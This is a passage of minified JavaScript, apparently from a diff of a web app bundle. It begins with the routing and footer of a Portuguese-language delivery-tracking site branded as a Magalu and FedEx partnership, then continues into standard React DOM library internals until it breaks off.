Parceria Magalu e FedEx. Todos os direitos reservados."}),(0,Te.jsxs)("div",{className:"termos-footer-cnpj",children:[(0,Te.jsx)("span",{children:"Magalu: CNPJ 47.960.950/0001-21"}),(0,Te.jsx)("span",{children:"FedEx: CNPJ 10.970.887/0001-02"})]})]})})]})},Ra=()=>(0,Te.jsxs)(be,{children:[(0,Te.jsx)(ve,{path:"/",element:(0,Te.jsx)(Ce,{})}),(0,Te.jsx)(ve,{path:"/verificacao",element:(0,Te.jsx)(Pe,{})}),(0,Te.jsx)(ve,{path:"/sucesso",element:(0,Te.jsx)(Oe,{})}),(0,Te.jsx)(ve,{path:"/rastreamento/:trackingCode",element:(0,Te.jsx)(Ta,{})}),(0,Te.jsx)(ve,{path:"/admin",element:(0,Te.jsx)(Ca,{})}),(0,Te.jsx)(ve,{path:"/termos",element:(0,Te.jsx)(Na,{})})]});const Pa=function(){return(0,Te.jsx)(Se,{children:(0,Te.jsx)(Ra,{})})};o.createRoot(document.getElementById("root")).render((0,Te.jsx)(a.StrictMode,{children:(0,Te.jsx)(Pa,{})}))})();
+(() => {
+    "use strict";
+    var e = {
+        730: (e, t, n) => {
+            var r = n(43),
+                a = n(853);
+
+            function s(e) {
+                for (var t = "https://reactjs.org/docs/error-decoder.html?invariant=" + e, n = 1; n < arguments.length; n++) t += "&args[]=" + encodeURIComponent(arguments[n]);
+                return "Minified React error #" + e + "; visit " + t + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
+            }
+            var o = new Set,
+                i = {};
+
+            function l(e, t) {
+                c(e, t), c(e + "Capture", t)
+            }
+
+            function c(e, t) {
+                for (i[e] = t, e = 0; e < t.length; e++) o.add(t[e])
+            }
+            var u = !("undefined" === typeof window || "undefined" === typeof window.document || "undefined" === typeof window.document.createElement),
+                d = Object.prototype.hasOwnProperty,
+                h = /^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,
+                f = {},
+                p = {};
+
+            function m(e, t, n, r, a, s, o) {
+                this.acceptsBooleans = 2 === t || 3 === t || 4 === t, this.attributeName = r, this.attributeNamespace = a, this.mustUseProperty = n, this.propertyName = e, this.type = t, this.sanitizeURL = s, this.removeEmptyString = o
+            }
+            var g = {};
+            "children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach((function(e) {
+                g[e] = new m(e, 0, !1, e, null, !1, !1)
+            })), [
+                ["acceptCharset", "accept-charset"],
+                ["className", "class"],
+                ["htmlFor", "for"],
+                ["httpEquiv", "http-equiv"]
+            ].forEach((function(e) {
+                var t = e[0];
+                g[t] = new m(t, 1, !1, e[1], null, !1, !1)
+            })), ["contentEditable", "draggable", "spellCheck", "value"].forEach((function(e) {
+                g[e] = new m(e, 2, !1, e.toLowerCase(), null, !1, !1)
+            })), ["autoReverse", "externalResourcesRequired", "focusable", "preserveAlpha"].forEach((function(e) {
+                g[e] = new m(e, 2, !1, e, null, !1, !1)
+            })), "allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach((function(e) {
+                g[e] = new m(e, 3, !1, e.toLowerCase(), null, !1, !1)
+            })), ["checked", "multiple", "muted", "selected"].forEach((function(e) {
+                g[e] = new m(e, 3, !0, e, null, !1, !1)
+            })), ["capture", "download"].forEach((function(e) {
+                g[e] = new m(e, 4, !1, e, null, !1, !1)
+            })), ["cols", "rows", "size", "span"].forEach((function(e) {
+                g[e] = new m(e, 6, !1, e, null, !1, !1)
+            })), ["rowSpan", "start"].forEach((function(e) {
+                g[e] = new m(e, 5, !1, e.toLowerCase(), null, !1, !1)
+            }));
+            var v = /[\-:]([a-z])/g;
+
+            function y(e) {
+                return e[1].toUpperCase()
+            }
+
+            function b(e, t, n, r) {
+                var a = g.hasOwnProperty(t) ? g[t] : null;
+                (null !== a ? 0 !== a.type : r || !(2 < t.length) || "o" !== t[0] && "O" !== t[0] || "n" !== t[1] && "N" !== t[1]) && (function(e, t, n, r) {
+                    if (null === t || "undefined" === typeof t || function(e, t, n, r) {
+                            if (null !== n && 0 === n.type) return !1;
+                            switch (typeof t) {
+                                case "function":
+                                case "symbol":
+                                    return !0;
+                                case "boolean":
+                                    return !r && (null !== n ? !n.acceptsBooleans : "data-" !== (e = e.toLowerCase().slice(0, 5)) && "aria-" !== e);
+                                default:
+                                    return !1
+                            }
+                        }(e, t, n, r)) return !0;
+                    if (r) return !1;
+                    if (null !== n) switch (n.type) {
+                        case 3:
+                            return !t;
+                        case 4:
+                            return !1 === t;
+                        case 5:
+                            return isNaN(t);
+                        case 6:
+                            return isNaN(t) || 1 > t
+                    }
+                    return !1
+                }(t, n, a, r) && (n = null), r || null === a ? function(e) {
+                    return !!d.call(p, e) || !d.call(f, e) && (h.test(e) ? p[e] = !0 : (f[e] = !0, !1))
+                }(t) && (null === n ? e.removeAttribute(t) : e.setAttribute(t, "" + n)) : a.mustUseProperty ? e[a.propertyName] = null === n ? 3 !== a.type && "" : n : (t = a.attributeName, r = a.attributeNamespace, null === n ? e.removeAttribute(t) : (n = 3 === (a = a.type) || 4 === a && !0 === n ? "" : "" + n, r ? e.setAttributeNS(r, t, n) : e.setAttribute(t, n))))
+            }
+            "accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach((function(e) {
+                var t = e.replace(v, y);
+                g[t] = new m(t, 1, !1, e, null, !1, !1)
+            })), "xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach((function(e) {
+                var t = e.replace(v, y);
+                g[t] = new m(t, 1, !1, e, "http://www.w3.org/1999/xlink", !1, !1)
+            })), ["xml:base", "xml:lang", "xml:space"].forEach((function(e) {
+                var t = e.replace(v, y);
+                g[t] = new m(t, 1, !1, e, "http://www.w3.org/XML/1998/namespace", !1, !1)
+            })), ["tabIndex", "crossOrigin"].forEach((function(e) {
+                g[e] = new m(e, 1, !1, e.toLowerCase(), null, !1, !1)
+            })), g.xlinkHref = new m("xlinkHref", 1, !1, "xlink:href", "http://www.w3.org/1999/xlink", !0, !1), ["src", "href", "action", "formAction"].forEach((function(e) {
+                g[e] = new m(e, 1, !1, e.toLowerCase(), null, !0, !0)
+            }));
+            var w = r.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,
+                _ = Symbol.for("react.element"),
+                k = Symbol.for("react.portal"),
+                x = Symbol.for("react.fragment"),
+                S = Symbol.for("react.strict_mode"),
+                E = Symbol.for("react.profiler"),
+                j = Symbol.for("react.provider"),
+                T = Symbol.for("react.context"),
+                C = Symbol.for("react.forward_ref"),
+                N = Symbol.for("react.suspense"),
+                R = Symbol.for("react.suspense_list"),
+                P = Symbol.for("react.memo"),
+                O = Symbol.for("react.lazy");
+            Symbol.for("react.scope"), Symbol.for("react.debug_trace_mode");
+            var A = Symbol.for("react.offscreen");
+            Symbol.for("react.legacy_hidden"), Symbol.for("react.cache"), Symbol.for("react.tracing_marker");
+            var I = Symbol.iterator;
+
+            function L(e) {
+                return null === e || "object" !== typeof e ? null : "function" === typeof(e = I && e[I] || e["@@iterator"]) ? e : null
+            }
+            var D, U = Object.assign;
+
+            function M(e) {
+                if (void 0 === D) try {
+                    throw Error()
+                } catch (n) {
+                    var t = n.stack.trim().match(/\n( *(at )?)/);
+                    D = t && t[1] || ""
+                }
+                return "\n" + D + e
+            }
+            var z = !1;
+
+            function B(e, t) {
+                if (!e || z) return "";
+                z = !0;
+                var n = Error.prepareStackTrace;
+                Error.prepareStackTrace = void 0;
+                try {
+                    if (t)
+                        if (t = function() {
+                                throw Error()
+                            }, Object.defineProperty(t.prototype, "props", {
+                                set: function() {
+                                    throw Error()
+                                }
+                            }), "object" === typeof Reflect && Reflect.construct) {
+                            try {
+                                Reflect.construct(t, [])
+                            } catch (c) {
+                                var r = c
+                            }
+                            Reflect.construct(e, [], t)
+                        } else {
+                            try {
+                                t.call()
+                            } catch (c) {
+                                r = c
+                            }
+                            e.call(t.prototype)
+                        } else {
+                        try {
+                            throw Error()
+                        } catch (c) {
+                            r = c
+                        }
+                        e()
+                    }
+                } catch (c) {
+                    if (c && r && "string" === typeof c.stack) {
+                        for (var a = c.stack.split("\n"), s = r.stack.split("\n"), o = a.length - 1, i = s.length - 1; 1 <= o && 0 <= i && a[o] !== s[i];) i--;
+                        for (; 1 <= o && 0 <= i; o--, i--)
+                            if (a[o] !== s[i]) {
+                                if (1 !== o || 1 !== i) do {
+                                    if (o--, 0 > --i || a[o] !== s[i]) {
+                                        var l = "\n" + a[o].replace(" at new ", " at ");
+                                        return e.displayName && l.includes("<anonymous>") && (l = l.replace("<anonymous>", e.displayName)), l
+                                    }
+                                } while (1 <= o && 0 <= i);
+                                break
+                            }
+                    }
+                } finally {
+                    z = !1, Error.prepareStackTrace = n
+                }
+                return (e = e ? e.displayName || e.name : "") ? M(e) : ""
+            }
+
+            function F(e) {
+                switch (e.tag) {
+                    case 5:
+                        return M(e.type);
+                    case 16:
+                        return M("Lazy");
+                    case 13:
+                        return M("Suspense");
+                    case 19:
+                        return M("SuspenseList");
+                    case 0:
+                    case 2:
+                    case 15:
+                        return e = B(e.type, !1);
+                    case 11:
+                        return e = B(e.type.render, !1);
+                    case 1:
+                        return e = B(e.type, !0);
+                    default:
+                        return ""
+                }
+            }
+
+            function V(e) {
+                if (null == e) return null;
+                if ("function" === typeof e) return e.displayName || e.name || null;
+                if ("string" === typeof e) return e;
+                switch (e) {
+                    case x:
+                        return "Fragment";
+                    case k:
+                        return "Portal";
+                    case E:
+                        return "Profiler";
+                    case S:
+                        return "StrictMode";
+                    case N:
+                        return "Suspense";
+                    case R:
+                        return "SuspenseList"
+                }
+                if ("object" === typeof e) switch (e.$$typeof) {
+                    case T:
+                        return (e.displayName || "Context") + ".Consumer";
+                    case j:
+                        return (e._context.displayName || "Context") + ".Provider";
+                    case C:
+                        var t = e.render;
+                        return (e = e.displayName) || (e = "" !== (e = t.displayName || t.name || "") ? "ForwardRef(" + e + ")" : "ForwardRef"), e;
+                    case P:
+                        return null !== (t = e.displayName || null) ? t : V(e.type) || "Memo";
+                    case O:
+                        t = e._payload, e = e._init;
+                        try {
+                            return V(e(t))
+                        } catch (n) {}
+                }
+                return null
+            }
+
+            function q(e) {
+                var t = e.type;
+                switch (e.tag) {
+                    case 24:
+                        return "Cache";
+                    case 9:
+                        return (t.displayName || "Context") + ".Consumer";
+                    case 10:
+                        return (t._context.displayName || "Context") + ".Provider";
+                    case 18:
+                        return "DehydratedFragment";
+                    case 11:
+                        return e = (e = t.render).displayName || e.name || "", t.displayName || ("" !== e ? "ForwardRef(" + e + ")" : "ForwardRef");
+                    case 7:
+                        return "Fragment";
+                    case 5:
+                        return t;
+                    case 4:
+                        return "Portal";
+                    case 3:
+                        return "Root";
+                    case 6:
+                        return "Text";
+                    case 16:
+                        return V(t);
+                    case 8:
+                        return t === S ? "StrictMode" : "Mode";
+                    case 22:
+                        return "Offscreen";
+                    case 12:
+                        return "Profiler";
+                    case 21:
+                        return "Scope";
+                    case 13:
+                        return "Suspense";
+                    case 19:
+                        return "SuspenseList";
+                    case 25:
+                        return "TracingMarker";
+                    case 1:
+                    case 0:
+                    case 17:
+                    case 2:
+                    case 14:
+                    case 15:
+                        if ("function" === typeof t) return t.displayName || t.name || null;
+                        if ("string" === typeof t) return t
+                }
+                return null
+            }
+
+            function W(e) {
+                switch (typeof e) {
+                    case "boolean":
+                    case "number":
+                    case "string":
+                    case "undefined":
+                    case "object":
+                        return e;
+                    default:
+                        return ""
+                }
+            }
+
+            function H(e) {
+                var t = e.type;
+                return (e = e.nodeName) && "input" === e.toLowerCase() && ("checkbox" === t || "radio" === t)
+            }
+
+            function K(e) {
+                e._valueTracker || (e._valueTracker = function(e) {
+                    var t = H(e) ? "checked" : "value",
+                        n = Object.getOwnPropertyDescriptor(e.constructor.prototype, t),
+                        r = "" + e[t];
+                    if (!e.hasOwnProperty(t) && "undefined" !== typeof n && "function" === typeof n.get && "function" === typeof n.set) {
+                        var a = n.get,
+                            s = n.set;
+                        return Object.defineProperty(e, t, {
+                            configurable: !0,
+                            get: function() {
+                                return a.call(this)
+                            },
+                            set: function(e) {
+                                r = "" + e, s.call(this, e)
+                            }
+                        }), Object.defineProperty(e, t, {
+                            enumerable: n.enumerable
+                        }), {
+                            getValue: function() {
+                                return r
+                            },
+                            setValue: function(e) {
+                                r = "" + e
+                            },
+                            stopTracking: function() {
+                                e._valueTracker = null, delete e[t]
+                            }
+                        }
+                    }
+                }(e))
+            }
+
+            function G(e) {
+                if (!e) return !1;
+                var t = e._valueTracker;
+                if (!t) return !0;
+                var n = t.getValue(),
+                    r = "";
+                return e && (r = H(e) ? e.checked ? "true" : "false" : e.value), (e = r) !== n && (t.setValue(e), !0)
+            }
+
+            function J(e) {
+                if ("undefined" === typeof(e = e || ("undefined" !== typeof document ? document : void 0))) return null;
+                try {
+                    return e.activeElement || e.body
+                } catch (t) {
+                    return e.body
+                }
+            }
+
+            function $(e, t) {
+                var n = t.checked;
+                return U({}, t, {
+                    defaultChecked: void 0,
+                    defaultValue: void 0,
+                    value: void 0,
+                    checked: null != n ? n : e._wrapperState.initialChecked
+                })
+            }
+
+            function Q(e, t) {
+                var n = null == t.defaultValue ? "" : t.defaultValue,
+                    r = null != t.checked ? t.checked : t.defaultChecked;
+                n = W(null != t.value ? t.value : n), e._wrapperState = {
+                    initialChecked: r,
+                    initialValue: n,
+                    controlled: "checkbox" === t.type || "radio" === t.type ? null != t.checked : null != t.value
+                }
+            }
+
+            function Y(e, t) {
+                null != (t = t.checked) && b(e, "checked", t, !1)
+            }
+
+            function X(e, t) {
+                Y(e, t);
+                var n = W(t.value),
+                    r = t.type;
+                if (null != n) "number" === r ? (0 === n && "" === e.value || e.value != n) && (e.value = "" + n) : e.value !== "" + n && (e.value = "" + n);
+                else if ("submit" === r || "reset" === r) return void e.removeAttribute("value");
+                t.hasOwnProperty("value") ? ee(e, t.type, n) : t.hasOwnProperty("defaultValue") && ee(e, t.type, W(t.defaultValue)), null == t.checked && null != t.defaultChecked && (e.defaultChecked = !!t.defaultChecked)
+            }
+
+            function Z(e, t, n) {
+                if (t.hasOwnProperty("value") || t.hasOwnProperty("defaultValue")) {
+                    var r = t.type;
+                    if (!("submit" !== r && "reset" !== r || void 0 !== t.value && null !== t.value)) return;
+                    t = "" + e._wrapperState.initialValue, n || t === e.value || (e.value = t), e.defaultValue = t
+                }
+                "" !== (n = e.name) && (e.name = ""), e.defaultChecked = !!e._wrapperState.initialChecked, "" !== n && (e.name = n)
+            }
+
+            function ee(e, t, n) {
+                "number" === t && J(e.ownerDocument) === e || (null == n ? e.defaultValue = "" + e._wrapperState.initialValue : e.defaultValue !== "" + n && (e.defaultValue = "" + n))
+            }
+            var te = Array.isArray;
+
+            function ne(e, t, n, r) {
+                if (e = e.options, t) {
+                    t = {};
+                    for (var a = 0; a < n.length; a++) t["$" + n[a]] = !0;
+                    for (n = 0; n < e.length; n++) a = t.hasOwnProperty("$" + e[n].value), e[n].selected !== a && (e[n].selected = a), a && r && (e[n].defaultSelected = !0)
+                } else {
+                    for (n = "" + W(n), t = null, a = 0; a < e.length; a++) {
+                        if (e[a].value === n) return e[a].selected = !0, void(r && (e[a].defaultSelected = !0));
+                        null !== t || e[a].disabled || (t = e[a])
+                    }
+                    null !== t && (t.selected = !0)
+                }
+            }
+
+            function re(e, t) {
+                if (null != t.dangerouslySetInnerHTML) throw Error(s(91));
+                return U({}, t, {
+                    value: void 0,
+                    defaultValue: void 0,
+                    children: "" + e._wrapperState.initialValue
+                })
+            }
+
+            function ae(e, t) {
+                var n = t.value;
+                if (null == n) {
+                    if (n = t.children, t = t.defaultValue, null != n) {
+                        if (null != t) throw Error(s(92));
+                        if (te(n)) {
+                            if (1 < n.length) throw Error(s(93));
+                            n = n[0]
+                        }
+                        t = n
+                    }
+                    null == t && (t = ""), n = t
+                }
+                e._wrapperState = {
+                    initialValue: W(n)
+                }
+            }
+
+            function se(e, t) {
+                var n = W(t.value),
+                    r = W(t.defaultValue);
+                null != n && ((n = "" + n) !== e.value && (e.value = n), null == t.defaultValue && e.defaultValue !== n && (e.defaultValue = n)), null != r && (e.defaultValue = "" + r)
+            }
+
+            function oe(e) {
+                var t = e.textContent;
+                t === e._wrapperState.initialValue && "" !== t && null !== t && (e.value = t)
+            }
+
+            function ie(e) {
+                switch (e) {
+                    case "svg":
+                        return "http://www.w3.org/2000/svg";
+                    case "math":
+                        return "http://www.w3.org/1998/Math/MathML";
+                    default:
+                        return "http://www.w3.org/1999/xhtml"
+                }
+            }
+
+            function le(e, t) {
+                return null == e || "http://www.w3.org/1999/xhtml" === e ? ie(t) : "http://www.w3.org/2000/svg" === e && "foreignObject" === t ? "http://www.w3.org/1999/xhtml" : e
+            }
+            var ce, ue, de = (ue = function(e, t) {
+                if ("http://www.w3.org/2000/svg" !== e.namespaceURI || "innerHTML" in e) e.innerHTML = t;
+                else {
+                    for ((ce = ce || document.createElement("div")).innerHTML = "<svg>" + t.valueOf().toString() + "</svg>", t = ce.firstChild; e.firstChild;) e.removeChild(e.firstChild);
+                    for (; t.firstChild;) e.appendChild(t.firstChild)
+                }
+            }, "undefined" !== typeof MSApp && MSApp.execUnsafeLocalFunction ? function(e, t, n, r) {
+                MSApp.execUnsafeLocalFunction((function() {
+                    return ue(e, t)
+                }))
+            } : ue);
+
+            function he(e, t) {
+                if (t) {
+                    var n = e.firstChild;
+                    if (n && n === e.lastChild && 3 === n.nodeType) return void(n.nodeValue = t)
+                }
+                e.textContent = t
+            }
+            var fe = {
+                animationIterationCount: !0,
+                aspectRatio: !0,
+                borderImageOutset: !0,
+                borderImageSlice: !0,
+                borderImageWidth: !0,
+                boxFlex: !0,
+                boxFlexGroup: !0,
+                boxOrdinalGroup: !0,
+                columnCount: !0,
+                columns: !0,
+                flex: !0,
+                flexGrow: !0,
+                flexPositive: !0,
+                flexShrink: !0,
+                flexNegative: !0,
+                flexOrder: !0,
+                gridArea: !0,
+                gridRow: !0,
+                gridRowEnd: !0,
+                gridRowSpan: !0,
+                gridRowStart: !0,
+                gridColumn: !0,
+                gridColumnEnd: !0,
+                gridColumnSpan: !0,
+                gridColumnStart: !0,
+                fontWeight: !0,
+                lineClamp: !0,
+                lineHeight: !0,
+                opacity: !0,
+                order: !0,
+                orphans: !0,
+                tabSize: !0,
+                widows: !0,
+                zIndex: !0,
+                zoom: !0,
+                fillOpacity: !0,
+                floodOpacity: !0,
+                stopOpacity: !0,
+                strokeDasharray: !0,
+                strokeDashoffset: !0,
+                strokeMiterlimit: !0,
+                strokeOpacity: !0,
+                strokeWidth: !0
+            },
+                pe = ["Webkit", "ms", "Moz", "O"];
+
+            function me(e, t, n) {
+                return null == t || "boolean" === typeof t || "" === t ? "" : n || "number" !== typeof t || 0 === t || fe.hasOwnProperty(e) && fe[e] ? ("" + t).trim() : t + "px"
+            }
+
+            function ge(e, t) {
+                for (var n in e = e.style, t)
+                    if (t.hasOwnProperty(n)) {
+                        var r = 0 === n.indexOf("--"),
+                            a = me(n, t[n], r);
+                        "float" === n && (n = "cssFloat"), r ? e.setProperty(n, a) : e[n] = a
+                    }
+            }
+            Object.keys(fe).forEach((function(e) {
+                pe.forEach((function(t) {
+                    t = t + e.charAt(0).toUpperCase() + e.substring(1), fe[t] = fe[e]
+                }))
+            }));
+            var ve = U({
+                menuitem: !0
+            }, {
+                area: !0,
+                base: !0,
+                br: !0,
+                col: !0,
+                embed: !0,
+                hr: !0,
+                img: !0,
+                input: !0,
+                keygen: !0,
+                link: !0,
+                meta: !0,
+                param: !0,
+                source: !0,
+                track: !0,
+                wbr: !0
+            });
+
+            function ye(e, t) {
+                if (t) {
+                    if (ve[e] && (null != t.children || null != t.dangerouslySetInnerHTML)) throw Error(s(137, e));
+                    if (null != t.dangerouslySetInnerHTML) {
+                        if (null != t.children) throw Error(s(60));
+                        if ("object" !== typeof t.dangerouslySetInnerHTML || !("__html" in t.dangerouslySetInnerHTML)) throw Error(s(61))
+                    }
+                    if (null != t.style && "object" !== typeof t.style) throw Error(s(62))
+                }
+            }
+
+            function be(e, t) {
+                if (-1 === e.indexOf("-")) return "string" === typeof t.is;
+                switch (e) {
+                    case "annotation-xml":
+                    case "color-profile":
+                    case "font-face":
+                    case "font-face-src":
+                    case "font-face-uri":
+                    case "font-face-format":
+                    case "font-face-name":
+                    case "missing-glyph":
+                        return !1;
+                    default:
+                        return !0
+                }
+            }
+            var we = null;
+
+            function _e(e) {
+                return (e = e.target || e.srcElement || window).correspondingUseElement && (e = e.correspondingUseElement), 3 === e.nodeType ? e.parentNode : e
+            }
+            var ke = null,
+                xe = null,
+                Se = null;
+
+            function Ee(e) {
+                if (e = ba(e)) {
+                    if ("function" !== typeof ke) throw Error(s(280));
+                    var t = e.stateNode;
+                    t && (t = _a(t), ke(e.stateNode, e.type, t))
+                }
+            }
+
+            function je(e) {
+                xe ? Se ? Se.push(e) : Se = [e] : xe = e
+            }
+
+            function Te() {
+                if (xe) {
+                    var e = xe,
+                        t = Se;
+                    if (Se = xe = null, Ee(e), t)
+                        for (e = 0; e < t.length; e++) Ee(t[e])
+                }
+            }
+
+            function Ce(e, t) {
+                return e(t)
+            }
+
+            function Ne() {}
+            var Re = !1;
+
+            function Pe(e, t, n) {
+                if (Re) return e(t, n);
+                Re = !0;
+                try {
+                    return Ce(e, t, n)
+                } finally {
+                    Re = !1, (null !== xe || null !== Se) && (Ne(), Te())
+                }
+            }
+
+            function Oe(e, t) {
+                var n = e.stateNode;
+                if (null === n) return null;
+                var r = _a(n);
+                if (null === r) return null;
+                n = r[t];
+                e: switch (t) {
+                    case "onClick":
+                    case "onClickCapture":
+                    case "onDoubleClick":
+                    case "onDoubleClickCapture":
+                    case "onMouseDown":
+                    case "onMouseDownCapture":
+                    case "onMouseMove":
+                    case "onMouseMoveCapture":
+                    case "onMouseUp":
+                    case "onMouseUpCapture":
+                    case "onMouseEnter":
+                        (r = !r.disabled) || (r = !("button" === (e = e.type) || "input" === e || "select" === e || "textarea" === e)), e = !r;
+                        break e;
+                    default:
+                        e = !1
+                }
+                if (e) return null;
+                if (n && "function" !== typeof n) throw Error(s(231, t, typeof n));
+                return n
+            }
+            var Ae = !1;
+            if (u) try {
+                var Ie = {};
+                Object.defineProperty(Ie, "passive", {
+                    get: function() {
+                        Ae = !0
+                    }
+                }), window.addEventListener("test", Ie, Ie), window.removeEventListener("test", Ie, Ie)
+            } catch (ue) {
+                Ae = !1
+            }
+
+            function Le(e, t, n, r, a, s, o, i, l) {
+                var c = Array.prototype.slice.call(arguments, 3);
+                try {
+                    t.apply(n, c)
+                } catch (u) {
+                    this.onError(u)
+                }
+            }
+            var De = !1,
+                Ue = null,
+                Me = !1,
+                ze = null,
+                Be = {
+                    onError: function(e) {
+                        De = !0, Ue = e
+                    }
+                };
+
+            function Fe(e, t, n, r, a, s, o, i, l) {
+                De = !1, Ue = null, Le.apply(Be, arguments)
+            }
+
+            function Ve(e) {
+                var t = e,
+                    n = e;
+                if (e.alternate)
+                    for (; t.return;) t = t.return;
+                else {
+                    e = t;
+                    do {
+                        0 !== (4098 & (t = e).flags) && (n = t.return), e = t.return
+                    } while (e)
+                }
+                return 3 === t.tag ? n : null
+            }
+
+            function qe(e) {
+                if (13 === e.tag) {
+                    var t = e.memoizedState;
+                    if (null === t && (null !== (e = e.alternate) && (t = e.memoizedState)), null !== t) return t.dehydrated
+                }
+                return null
+            }
+
+            function We(e) {
+                if (Ve(e) !== e) throw Error(s(188))
+            }
+
+            function He(e) {
+                return null !== (e = function(e) {
+                    var t = e.alternate;
+                    if (!t) {
+                        if (null === (t = Ve(e))) throw Error(s(188));
+                        return t !== e ? null : e
+                    }
+                    for (var n = e, r = t;;) {
+                        var a = n.return;
+                        if (null === a) break;
+                        var o = a.alternate;
+                        if (null === o) {
+                            if (null !== (r = a.return)) {
+                                n = r;
+                                continue
+                            }
+                            break
+                        }
+                        if (a.child === o.child) {
+                            for (o = a.child; o;) {
+                                if (o === n) return We(a), e;
+                                if (o === r) return We(a), t;
+                                o = o.sibling
+                            }
+                            throw Error(s(188))
+                        }
+                        if (n.return !== r.return) n = a, r = o;
+                        else {
+                            for (var i = !1, l = a.child; l;) {
+                                if (l === n) {
+                                    i = !0, n = a, r = o;
+                                    break
+                                }
+                                if (l === r) {
+                                    i = !0, r = a, n = o;
+                                    break
+                                }
+                                l = l.sibling
+                            }
+                            if (!i) {
+                                for (l = o.child; l;) {
+                                    if (l === n) {
+                                        i = !0, n = o, r = a;
+                                        break
+                                    }
+                                    if (l === r) {
+                                        i = !0, r = o, n = a;
+                                        break
+                                    }
+                                    l = l.sibling
+                                }
+                                if (!i) throw Error(s(189))
+                            }
+                        }
+                        if (n.alternate !== r) throw Error(s(190))
+                    }
+                    if (3 !== n.tag) throw Error(s(188));
+                    return n.stateNode.current === n ? e : t
+                }(e)) ? Ke(e) : null
+            }
+
+            function Ke(e) {
+                if (5 === e.tag || 6 === e.tag) return e;
+                for (e = e.child; null !== e;) {
+                    var t = Ke(e);
+                    if (null !== t) return t;
+                    e = e.sibling
+                }
+                return null
+            }
+            var Ge = a.unstable_scheduleCallback,
+                Je = a.unstable_cancelCallback,
+                $e = a.unstable_shouldYield,
+                Qe = a.unstable_requestPaint,
+                Ye = a.unstable_now,
+                Xe = a.unstable_getCurrentPriorityLevel,
+                Ze = a.unstable_ImmediatePriority,
+                et = a.unstable_UserBlockingPriority,
+                tt = a.unstable_NormalPriority,
+                nt = a.unstable_LowPriority,
+                rt = a.unstable_IdlePriority,
+                at = null,
+                st = null;
+            var ot = Math.clz32 ? Math.clz32 : function(e) {
+                    return e >>>= 0, 0 === e ? 32 : 31 - (it(e) / lt | 0) | 0
+                },
+                it = Math.log,
+                lt = Math.LN2;
+            var ct = 64,
+                ut = 4194304;
+
+            function dt(e) {
+                switch (e & -e) {
+                    case 1:
+                        return 1;
+                    case 2:
+                        return 2;
+                    case 4:
+                        return 4;
+                    case 8:
+                        return 8;
+                    case 16:
+                        return 16;
+                    case 32:
+                        return 32;
+                    case 64:
+                    case 128:
+                    case 256:
+                    case 512:
+                    case 1024:
+                    case 2048:
+                    case 4096:
+                    case 8192:
+                    case 16384:
+                    case 32768:
+                    case 65536:
+                    case 131072:
+                    case 262144:
+                    case 524288:
+                    case 1048576:
+                    case 2097152:
+                        return 4194240 & e;
+                    case 4194304:
+                    case 8388608:
+                    case 16777216:
+                    case 33554432:
+                    case 67108864:
+                        return 130023424 & e;
+                    case 134217728:
+                        return 134217728;
+                    case 268435456:
+                        return 268435456;
+                    case 536870912:
+                        return 536870912;
+                    case 1073741824:
+                        return 1073741824;
+                    default:
+                        return e
+                }
+            }
+
+            function ht(e, t) {
+                var n = e.pendingLanes;
+                if (0 === n) return 0;
+                var r = 0,
+                    a = e.suspendedLanes,
+                    s = e.pingedLanes,
+                    o = 268435455 & n;
+                if (0 !== o) {
+                    var i = o & ~a;
+                    0 !== i ? r = dt(i) : 0 !== (s &= o) && (r = dt(s))
+                } else 0 !== (o = n & ~a) ? r = dt(o) : 0 !== s && (r = dt(s));
+                if (0 === r) return 0;
+                if (0 !== t && t !== r && 0 === (t & a) && ((a = r & -r) >= (s = t & -t) || 16 === a && 0 !== (4194240 & s))) return t;
+                if (0 !== (4 & r) && (r |= 16 & n), 0 !== (t = e.entangledLanes))
+                    for (e = e.entanglements, t &= r; 0 < t;) a = 1 << (n = 31 - ot(t)), r |= e[n], t &= ~a;
+                return r
+            }
+
+            function ft(e, t) {
+                switch (e) {
+                    case 1:
+                    case 2:
+                    case 4:
+                        return t + 250;
+                    case 8:
+                    case 16:
+                    case 32:
+                    case 64:
+                    case 128:
+                    case 256:
+                    case 512:
+                    case 1024:
+                    case 2048:
+                    case 4096:
+                    case 8192:
+                    case 16384:
+                    case 32768:
+                    case 65536:
+                    case 131072:
+                    case 262144:
+                    case 524288:
+                    case 1048576:
+                    case 2097152:
+                        return t + 5e3;
+                    default:
+                        return -1
+                }
+            }
+
+            function pt(e) {
+                return 0 !== (e = -1073741825 & e.pendingLanes) ? e : 1073741824 & e ? 1073741824 : 0
+            }
+
+            function mt() {
+                var e = ct;
+                return 0 === (4194240 & (ct <<= 1)) && (ct = 64), e
+            }
+
+            function gt(e) {
+                for (var t = [], n = 0; 31 > n; n++) t.push(e);
+                return t
